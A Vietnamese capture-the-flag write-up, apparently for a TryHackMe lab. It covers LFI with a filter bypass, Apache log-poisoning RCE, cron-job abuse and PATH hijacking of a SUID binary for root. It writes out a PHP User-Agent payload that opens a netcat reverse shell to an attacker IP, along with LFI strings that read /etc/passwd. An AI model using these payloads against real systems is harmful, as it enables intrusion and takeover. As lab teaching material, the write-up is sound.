Port scan:

![enter image description here](https://imgur.com/q9fnf1w.png)

URL Brute-force với Gobuster:

![enter image description here](https://imgur.com/VzLE7Gw.png)

Kết quả brute-force có path /flags có vẻ thú vị, nhưng nó là rickroll prank. Không có gì có thể khai thác được sau khi xem qua page source và url brute-force. 
Giao diện khi truy cập webapp:

![enter image description here](https://imgur.com/KVSVS84.png)


Không có input nào để khai thác ở đây cả. Sau một thời gian dài bế tắc thì mình để ý thấy ở phần Header của page có chứa thông tin support, cụ thể là support@mafialive.thm. Truy cập mafialive.thm nhưng không được, mình nghĩ đó là một host khác trên target machine. Thêm host này vào /etc/hosts: `sudo echo 10.10.102.214 mafialive.thm >> /etc/hosts`. Truy cập được vào mafialive.thm và có flag đầu tiên:

![enter image description here](https://imgur.com/Gu49kVY.png)

Không có input để exploit, tiếp tục url brute-force:

![enter image description here](https://imgur.com/tSddjSd.png)


Tệp robots.txt:

![enter image description here](https://imgur.com/dqqHka5.png)

Truy cập /test.php:

![enter image description here](https://imgur.com/2jCyjIl.png)

Chức năng của button trong ảnh trên là thực thi file mrrobot.php như ảnh dưới đây:

![enter image description here](https://imgur.com/6ysPoA4.png)

Tốt rồi! Với việc tham số dưới dạng path, web app có thể chứa lỗ hổng Local File Inclusion (LFI). Thử truyền vào view=/etc/passwd nhưng không được phép truy cập -> có thể bị filter ở back-end. Có một số cách để đọc nội dung file khi có LFI, ta sẽ dùng php://filter để đọc mã nguồn file test.php (từ đó bypass filter). Truyền vào view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php (convert sang base64 để web app không thực thi mã php của file test.php):

![enter image description here](https://imgur.com/nRqQSA1.png)

Decode base64 có được mã nguồn file test.php:

![enter image description here](https://imgur.com/pZ6I9XR.png)

Có được flag thứ 2 và logic của filter. Đoạn code để filter thực hiện lấy giá trị tham số view, filter không cho phép giá trị tham số view có chứa "../.." và bắt buộc phải có chứa "/var/www/html/devepment_testing". Ta sẽ dùng ".././.." để bypass filter. Truyền vào view=php://filter/resource=/var/www/html/development_testing/.././.././.././../etc/passwd

![enter image description here](https://imgur.com/713fl8L.png)

Đọc thành công file /etc/passwd. Tuy không có gì hữu ích để khai thác nhưng cũng đã chứng minh được bypass filter thành công. Để truy cập được vào hệ thống, ta sẽ sử dụng kỹ thuật tấn công Apache Log Poisoning thông qua LFI.
Đầu tiên, mở netcat listener ở local để bắt reverse shell: `nc -lvnp 4444`. Inject đoạn mã sau vào header User-Agent của request: `<?php system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.21.36 4444 >/tmp/f'); ?>`. Truyền vào view=php://filter/resource=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log
Ở local bắt được reverse shell -> access gained. 

![enter image description here](https://imgur.com/dGWEyRc.png)

Lấy flag user ở /home/archangel/user.txt

![enter image description here](https://imgur.com/RAtL3d5.png)

Ta cần đặc quyền của user archangel để truy cập vào /home/archangel/secret. Tìm kiếm cronjob bằng `cat /etc/crontab`. phát hiện có cronjob chạy bằng quyền của archangel và file thực thi có quyền 777. Chèn payload vào file thực thi cronjob để có reverse shell (quyền archangel):

![enter image description here](https://imgur.com/5NABWrU.png)
![enter image description here](https://imgur.com/WIhysOV.png)

Lấy flag user2 ở /home/archangel/secret/user2.txt

![enter image description here](https://imgur.com/NFPymjp.png)

Đến lúc privesc để lên root. Trong /home/archangel/secret/ có SUID binary backup. Chạy `./backup` được báo lỗi:

![enter image description here](https://imgur.com/GYpV8Ys.png)

Điều đó chứng tỏ file /home/archangel/secret/backup có thực hiện gọi đến `cp`. Chạy `strings /home/archangel/secret/backup` để tìm kiếm các chuỗi đọc được ở trong file binary:

![enter image description here](https://imgur.com/BUxgf2h.png)

Để ý có dòng `cp /home/user/archangel/myfiles/* /opt/backupfiles` gọi đến lệnh `cp` nhưng không dùng đường dẫn trực tiếp. Ta có thể lợi dụng PATH variable để khai thác. Tạo file thực thi `/tmp/cp` có nội dung `/bin/bash -p`, thay đổi biến PATH thành `/tmp:$PATH` (để hệ thống tìm đến /tmp trước và thực thi `cp` ta vừa tạo). Chạy lại file /home/archangel/secret/backup để có quyền root:

![enter image description here](https://imgur.com/iF5TjWY.png)


Leo thang đặc quyền root thành công. Lấy root flag ở /root/root.txt.

Happy Hacking!
